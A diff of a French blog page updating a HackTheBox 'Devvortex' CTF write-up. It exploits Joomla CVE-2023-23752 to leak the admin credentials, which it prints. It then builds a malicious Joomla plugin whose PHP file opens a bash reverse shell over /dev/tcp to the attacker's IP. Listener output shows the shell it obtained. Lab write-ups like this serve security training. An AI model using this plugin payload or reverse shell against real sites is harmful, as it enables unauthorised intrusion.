@@ -8,11 +8,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>HTB - Devvortex &middot; Raizen | Blog</title>
-  <meta name="title" content="HTB - Devvortex &middot; Raizen | Blog" />
+  <title>Devvortex (HTB) &middot; Raizen | Blog</title>
+  <meta name="title" content="Devvortex (HTB) &middot; Raizen | Blog" />
   
-  <meta name="description" content="DevVortex est une machine Linux de niveau easy nécessitant un brute force DNS pour trouver un sous-domaine, suivi d&#39;un brute force de répertoire qui mènera sur la découverte d&#39;un dashboard admin **Joomla** obsolète..." />
-  <meta name="keywords" content="HackTheBox, Writups, " />
+  <meta name="description" content="Dans ce CTF HackTheBox, nous exploitons une vulnérabilité dans Joomla (CVE-2023-23752) pour accéder à des informations sensibles, puis utilisons une élévation de privilèges via apport-cli (CVE-2023-1326)." />
+  <meta name="keywords" content="CTF, Joomla, CVE-2023-23752, CVE-2023-1326, HackTheBox, Cybersecurity, " />
   
   
   <link rel="canonical" href="//localhost:1313/posts/htb-devvortex/" />
@@ -65,22 +65,26 @@
   
   <meta property="og:url" content="//localhost:1313/posts/htb-devvortex/">
   <meta property="og:site_name" content="Raizen | Blog">
-  <meta property="og:title" content="HTB - Devvortex">
-  <meta property="og:description" content="DevVortex est une machine Linux de niveau easy nécessitant un brute force DNS pour trouver un sous-domaine, suivi d’un brute force de répertoire qui mènera sur la découverte d’un dashboard admin Joomla obsolète…">
+  <meta property="og:title" content="Devvortex (HTB)">
+  <meta property="og:description" content="Dans ce CTF HackTheBox, nous exploitons une vulnérabilité dans Joomla (CVE-2023-23752) pour accéder à des informations sensibles, puis utilisons une élévation de privilèges via apport-cli (CVE-2023-1326).">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2023-09-04T00:00:00+00:00">
-    <meta property="article:modified_time" content="2023-09-04T00:00:00+00:00">
+    <meta property="article:published_time" content="2023-09-20T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-09-20T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Joomla">
+    <meta property="article:tag" content="CVE-2023-23752">
+    <meta property="article:tag" content="CVE-2023-1326">
     <meta property="article:tag" content="HackTheBox">
-    <meta property="article:tag" content="Writups">
+    <meta property="article:tag" content="Cybersecurity">
     <meta property="og:image" content="//localhost:1313/posts/htb-devvortex/cover.png">
 
   
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="//localhost:1313/posts/htb-devvortex/cover.png">
-  <meta name="twitter:title" content="HTB - Devvortex">
-  <meta name="twitter:description" content="DevVortex est une machine Linux de niveau easy nécessitant un brute force DNS pour trouver un sous-domaine, suivi d’un brute force de répertoire qui mènera sur la découverte d’un dashboard admin Joomla obsolète…">
+  <meta name="twitter:title" content="Devvortex (HTB)">
+  <meta name="twitter:description" content="Dans ce CTF HackTheBox, nous exploitons une vulnérabilité dans Joomla (CVE-2023-23752) pour accéder à des informations sensibles, puis utilisons une élévation de privilèges via apport-cli (CVE-2023-1326).">
 
   
   <script type="application/ld+json">
@@ -88,10 +92,10 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "HTB - Devvortex",
-    "headline": "HTB - Devvortex",
+    "name": "Devvortex (HTB)",
+    "headline": "Devvortex (HTB)",
     
-    "abstract": "DevVortex est une machine Linux de niveau easy nécessitant un brute force DNS pour trouver un sous-domaine, suivi d\u0026rsquo;un brute force de répertoire qui mènera sur la découverte d\u0026rsquo;un dashboard admin \u003cstrong\u003eJoomla\u003c\/strong\u003e obsolète\u0026hellip;",
+    "abstract": "Dans ce CTF HackTheBox, nous exploitons une vulnérabilité dans Joomla (CVE-2023-23752) pour accéder à des informations sensibles, puis utilisons une élévation de privilèges via apport-cli (CVE-2023-1326).",
     "inLanguage": "en",
     "url" : "\/\/localhost:1313\/posts\/htb-devvortex\/",
     "author" : {
@@ -99,15 +103,15 @@
       "name": "Rai2en"
     },
     "copyrightYear": "2023",
-    "dateCreated": "2023-09-04T00:00:00\u002b00:00",
-    "datePublished": "2023-09-04T00:00:00\u002b00:00",
+    "dateCreated": "2023-09-20T00:00:00\u002b00:00",
+    "datePublished": "2023-09-20T00:00:00\u002b00:00",
     
-    "dateModified": "2023-09-04T00:00:00\u002b00:00",
+    "dateModified": "2023-09-20T00:00:00\u002b00:00",
     
-    "keywords": ["HackTheBox","Writups"],
+    "keywords": ["CTF","Joomla","CVE-2023-23752","CVE-2023-1326","HackTheBox","Cybersecurity"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "92"
+    "wordCount": "500"
   }]
   </script>
 
@@ -540,7 +544,7 @@
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
       href="/posts/htb-devvortex/"
-      >HTB - Devvortex</a
+      >Devvortex (HTB)</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -549,7 +553,7 @@
 
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      HTB - Devvortex
+      Devvortex (HTB)
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -592,7 +596,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2023-09-04 00:00:00 &#43;0000 UTC">4 September 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+  <time datetime="2023-09-20 00:00:00 &#43;0000 UTC">20 September 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
   
 
   
@@ -644,7 +648,7 @@
     </div>
     
     
-    <div class="text-sm text-neutral-700 dark:text-neutral-400">Just a human or maybe not</div>
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">Exploiting the unseen, mastering the unknown</div>
     
     <div class="text-2xl sm:text-lg">
   <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
@@ -740,7 +744,81 @@
   
   <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
     
-    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#vue-densemble-du-service">Vue d&rsquo;ensemble du service</a></li>
+    <li><a href="#service-web">Service Web</a></li>
+    <li><a href="#identification-de-la-vulnérabilité-joomla">Identification de la vulnérabilité Joomla</a></li>
+    <li><a href="#configuration-du-shell-inverse">Configuration du Shell Inverse</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#vue-densemble-du-service">Vue d&rsquo;ensemble du service</a></li>
+    <li><a href="#service-web">Service Web</a></li>
+    <li><a href="#identification-de-la-vulnérabilité-joomla">Identification de la vulnérabilité Joomla</a></li>
+    <li><a href="#configuration-du-shell-inverse">Configuration du Shell Inverse</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+</script>
+   </div>
+      </div>
+      
 
       <div class="min-w-0 min-h-0 max-w-fit">
         
@@ -748,8 +826,181 @@
 
 
         <div class="article-content max-w-prose mb-20">
-          <p><a href="https://app.hackthebox.com/machines/devvortex" target="_blank">DevVortex</a> est une machine Linux de niveau easy nécessitant un brute force DNS pour trouver un sous-domaine, suivi d&rsquo;un brute force de répertoire qui mènera sur la découverte d&rsquo;un dashboard admin <code>Joomla</code> obsolète dont l&rsquo;exploitation permettra de trouver des identifiants de connexion. Le dashboard administrateur servira ensuite à éditer des fichiers PHP pour obtenir un reverse shell. Les mêmes identifiants de connexion, seront ensuite utilisés pour avoir accès à un hash MySQL, qu&rsquo;on déchiffrera avec John. La connexion via SSH révèlera ensuite l&rsquo;utilisation d&rsquo;une ancienne version <code>apport-cli</code>, permettant l&rsquo;exécution d&rsquo;un shell root.</p>
+          
 
+<h2 class="relative group">Introduction 
+    <div id="introduction" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#introduction" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Dans ce challenge de HackTheBox, nous allons d&rsquo;abord exploiter une vulnérabilité dans Joomla liée à la divulgation de données sensibles (CVE-2023-23752), puis utiliser une élévation de privilèges via apport-cli (CVE-2023-1326) pour obtenir un accès root.</p>
+<hr>
+
+
+<h2 class="relative group">Vue d&rsquo;ensemble du service 
+    <div id="vue-densemble-du-service" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#vue-densemble-du-service" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Pour scanner la machine <code>10.10.11.242</code>, nous utilisons rustscan :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wget https://github.com/RustScan/RustScan/files/9473239/rustscan_2.1.0_both.zip
+</span></span><span class="line"><span class="cl">$ unzip rustscan_2.1.0_both.zip
+</span></span><span class="line"><span class="cl">$ dpkg -i rustscan_2.1.0_amd64.deb
+</span></span><span class="line"><span class="cl">$ rustscan --ulimit<span class="o">=</span><span class="m">5000</span> --range<span class="o">=</span>1-65535 -a 10.10.11.242 -- -A -sC
+</span></span></code></pre></div><p>Le résultat du scan nous montre les services ouverts :</p>
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>ÉTAT</th>
+<th>SERVICE</th>
+<th>RAISON</th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>ouvert</td>
+<td>ssh</td>
+<td>syn-ack ttl 63</td>
+<td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu)</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>ouvert</td>
+<td>http</td>
+<td>syn-ack ttl 63</td>
+<td>nginx 1.18.0 (Ubuntu)</td>
+</tr>
+</tbody>
+</table>
+<hr>
+
+
+<h2 class="relative group">Service Web 
+    <div id="service-web" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#service-web" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Accéder au service web sur le port 80 nous redirige vers le domaine <code>devvortex.htb</code>, donc nous ajoutons cet hôte au fichier <code>/etc/hosts</code> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nano /etc/hosts
+</span></span><span class="line"><span class="cl">10.10.11.242 devvortex.htb
+</span></span></code></pre></div><p>Ensuite, nous recherchons les sous-domaines à l&rsquo;aide de gobuster :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gobuster vhost -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t <span class="m">20</span> -k
+</span></span></code></pre></div><p>Nous trouvons le sous-domaine <code>dev.devvortex.htb</code>, que nous ajoutons également au fichier <code>/etc/hosts</code> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nano /etc/hosts
+</span></span><span class="line"><span class="cl">10.10.11.242 devvortex.htb dev.devvortex.htb
+</span></span></code></pre></div><p>Nous recherchons ensuite des répertoires intéressants avec wfuzz :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --sc 202,204,301,302,307,403 http://dev.devvortex.htb/FUZZ
+</span></span></code></pre></div><p>Nous identifions plusieurs répertoires intéressants, dont &ldquo;administrator&rdquo;, ce qui suggère l&rsquo;utilisation de Joomla.</p>
+<hr>
+
+
+<h2 class="relative group">Identification de la vulnérabilité Joomla 
+    <div id="identification-de-la-vuln%C3%A9rabilit%C3%A9-joomla" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#identification-de-la-vuln%C3%A9rabilit%C3%A9-joomla" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Nous utilisons <code>joomscan</code> pour vérifier la version de Joomla et découvrons que la version 4.2.6 est vulnérable à <strong>CVE-2023-23752</strong> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ joomscan --url http://dev.devvortex.htb
+</span></span></code></pre></div><p>Nous pouvons exploiter cette vulnérabilité pour divulguer des informations sensibles, telles que les identifiants d&rsquo;administration :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ git clone https://github.com/Acceis/exploit-CVE-2023-23752.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> exploit-CVE-2023-23752
+</span></span><span class="line"><span class="cl">$ gem install httpx docopt paint
+</span></span><span class="line"><span class="cl">$ ruby exploit.rb -h
+</span></span></code></pre></div><p>En exécutant l&rsquo;exploit, nous obtenons les identifiants pour l&rsquo;admin :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">lewis:P4ntherg0t1n5r3c0n##.
+</span></span></code></pre></div><p>Nous nous connectons à l&rsquo;interface d&rsquo;administration de Joomla.</p>
+<hr>
+
+
+<h2 class="relative group">Configuration du Shell Inverse 
+    <div id="configuration-du-shell-inverse" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#configuration-du-shell-inverse" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Nous créons les fichiers nécessaires pour installer un plugin contenant un shell inverse.</p>
+<p><strong>Fichier <code>shell.xml</code></strong> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;extension</span> <span class="na">version=</span><span class="s">&#34;4.0&#34;</span> <span class="na">type=</span><span class="s">&#34;plugin&#34;</span> <span class="na">group=</span><span class="s">&#34;content&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;name&gt;</span>plg_content_shell<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;author&gt;</span>1<span class="nt">&lt;/author&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;creationDate&gt;</span>December 28, 2021<span class="nt">&lt;/creationDate&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;copyright&gt;</span>Free<span class="nt">&lt;/copyright&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;authorEmail&gt;</span>1@1.com<span class="nt">&lt;/authorEmail&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;authorUrl&gt;</span>http://1.com<span class="nt">&lt;/authorUrl&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;version&gt;</span>1.0<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;description&gt;</span>shell<span class="nt">&lt;/description&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;files&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;filename</span> <span class="na">plugin=</span><span class="s">&#34;shell&#34;</span><span class="nt">&gt;</span>shell.php<span class="nt">&lt;/filename&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;filename&gt;</span>index.html<span class="nt">&lt;/filename&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nt">&lt;/files&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/extension&gt;</span>
+</span></span></code></pre></div><p><strong>Fichier <code>shell.php</code></strong> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.36/4444 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">defined</span><span class="p">(</span><span class="s1">&#39;_JEXEC&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">plgContentRevShell</span> <span class="k">extends</span> <span class="nx">JPlugin</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="k">function</span> <span class="nf">onContentAfterTitle</span><span class="p">(</span><span class="nv">$context</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$article</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$params</span><span class="p">,</span> <span class="nv">$limitstart</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="s2">&#34;&lt;p&gt;Boom!&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>Nous créons également un fichier <code>index.html</code> vide.</p>
+<p>Ensuite, nous zippons ces trois fichiers :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ touch index.html
+</span></span><span class="line"><span class="cl">$ zip revshell.zip shell.xml shell.php index.html
+</span></span></code></pre></div><p>Nous téléchargeons le fichier zip via l&rsquo;interface d&rsquo;installation de Joomla à l&rsquo;adresse suivante :</p>
+<pre tabindex="0"><code>http://dev.devvortex.htb/administrator/index.php?option=com_installer&amp;view=install
+</code></pre><p>Une fois le plugin installé et activé, nous obtenons notre shell inverse en écoutant sur le port 4444 :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -lnvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.16.36<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.242<span class="o">]</span> <span class="m">36564</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>854<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">www-data@devvortex:~/dev.devvortex.htb/administrator$ id
+</span></span></code></pre></div><hr>
+
+
+<h2 class="relative group">Conclusion 
+    <div id="conclusion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Nous avons exploité la vulnérabilité <strong>CVE-2023-23752</strong> pour obtenir des informations sensibles et nous avons configuré un shell inverse pour accéder à la machine. Par la suite, l&rsquo;exploitation d&rsquo;une élévation de privilèges via <strong>CVE-2023-1326</strong> nous permettra de prendre le contrôle total de la machine.</p>
+<pre tabindex="0"><code></code></pre>
         </div>
         
         
@@ -763,7 +1014,7 @@
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=//localhost:1313/posts/htb-devvortex/&amp;title=HTB%20-%20Devvortex"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=//localhost:1313/posts/htb-devvortex/&amp;title=Devvortex%20%28HTB%29"
       title="Share on LinkedIn"
       aria-label="Share on LinkedIn"
       >
@@ -782,7 +1033,7 @@
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://twitter.com/intent/tweet/?url=//localhost:1313/posts/htb-devvortex/&amp;text=HTB%20-%20Devvortex"
+      href="https://twitter.com/intent/tweet/?url=//localhost:1313/posts/htb-devvortex/&amp;text=Devvortex%20%28HTB%29"
       title="Tweet on Twitter"
       aria-label="Tweet on Twitter"
       >
@@ -800,7 +1051,7 @@
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://api.whatsapp.com/send?text=//localhost:1313/posts/htb-devvortex/&amp;resubmit=true&amp;title=HTB%20-%20Devvortex"
+      href="https://api.whatsapp.com/send?text=//localhost:1313/posts/htb-devvortex/&amp;resubmit=true&amp;title=Devvortex%20%28HTB%29"
       title=""
       aria-label=""
       >
@@ -819,7 +1070,7 @@
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://pinterest.com/pin/create/bookmarklet/?url=//localhost:1313/posts/htb-devvortex/&amp;description=HTB%20-%20Devvortex"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=//localhost:1313/posts/htb-devvortex/&amp;description=Devvortex%20%28HTB%29"
       title="Pin on Pinterest"
       aria-label="Pin on Pinterest"
       >
@@ -838,7 +1089,7 @@
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://reddit.com/submit/?url=//localhost:1313/posts/htb-devvortex/&amp;resubmit=true&amp;title=HTB%20-%20Devvortex"
+      href="https://reddit.com/submit/?url=//localhost:1313/posts/htb-devvortex/&amp;resubmit=true&amp;title=Devvortex%20%28HTB%29"
       title="Submit to Reddit"
       aria-label="Submit to Reddit"
       >
@@ -857,7 +1108,7 @@
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.facebook.com/sharer/sharer.php?u=//localhost:1313/posts/htb-devvortex/&amp;quote=HTB%20-%20Devvortex"
+      href="https://www.facebook.com/sharer/sharer.php?u=//localhost:1313/posts/htb-devvortex/&amp;quote=Devvortex%20%28HTB%29"
       title="Share on Facebook"
       aria-label="Share on Facebook"
       >
@@ -876,7 +1127,7 @@
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="mailto:?body=//localhost:1313/posts/htb-devvortex/&amp;subject=HTB%20-%20Devvortex"
+      href="mailto:?body=//localhost:1313/posts/htb-devvortex/&amp;subject=Devvortex%20%28HTB%29"
       title="Send via email"
       aria-label="Send via email"
       >
@@ -926,14 +1177,36 @@
       <div class="flex justify-between pt-3">
         <span>
           
-        </span>
-        <span>
-          
-            <a class="flex text-right group ml-3" href="/posts/proxychains/">
+            <a class="flex group mr-3" href="/posts/proxychains/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                   >Proxychains Guide</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-08-19 00:00:00 &#43;0000 UTC">19 August 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/nmap-guide/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Nmap Guide</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
